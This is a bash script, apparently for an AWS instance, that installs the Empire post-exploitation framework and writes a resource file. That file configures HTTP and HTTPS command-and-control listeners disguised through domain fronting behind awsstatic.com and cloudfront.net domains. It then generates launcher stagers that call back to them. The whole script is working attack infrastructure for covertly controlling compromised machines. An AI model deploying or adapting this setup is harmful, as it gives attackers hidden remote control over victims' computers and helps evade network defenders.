#! /bin/bash

# install deps
sudo apt-get update
sudo apt-get -y install git-core screen
sudo apt-get -y install python2.7 python2.7-dev
sudo apt-get -y install letsencrypt
sudo ln -s /usr/bin/python2.7 /usr/bin/python

# create ssl cert
# TODO modify this command so no interaction is needed
#letsencrypt --register-unsafely-without-email certonly
# certs stored here: etc/letsencrypt/live/$HOSTNAME/

# install and configure empire
git clone https://github.com/EmpireProject/Empire
cd Empire
RANDKEY=`cat /dev/urandom | tr -dc '0-9' | fold -w ${1:-32} | head -1`
sudo STAGING_KEY=$RANDKEY ./setup/install.sh

# use this command to get the external ip of our instance
EIP=`curl -s http://169.254.169.254/latest/meta-data/public-ipv4`

# create our empire resource script
(
cat <<EOF
listeners
uselistener http
set Name http80df
set Host http://d0.awsstatic.com:80
set DefaultProfile /admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (WindowsNT 6.1; WOW64; Trident/7.0;rv:11.0) like Gecko|Host:changeme.cloudfront.net
execute
listeners
uselistener http
set Name https443df
set Host https://d0.awsstatic.com:443
set Port 443
set DefaultProfile /admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (WindowsNT 6.1; WOW64; Trident/7.0;rv:11.0) like Gecko|Host:changeme.cloudfront.net
set CertPath /home/ubuntu/Empire/data/
listeners
usestager multi/launcher
set Listener http80df
set OutFile stager-http80df.txt
generate
unset OutFile
generate
listeners
usestager multi/launcher
set Listener https443df
set OutFile stager-https443df.txt
generate
unset OutFile
generate

EOF
) > listeners.rc

# start empire
screen -dmS empire sudo ./empire
# give empire time to start
sleep 5
# if you wanted to issue more commands, this is how you'd do it
#screen -S empire -X stuff 'resource listeners.rc\n'

# change perms on files for downloading
sleep 6
#sudo chown ubuntu:ubuntu /home/ubuntu/Empire/stage*
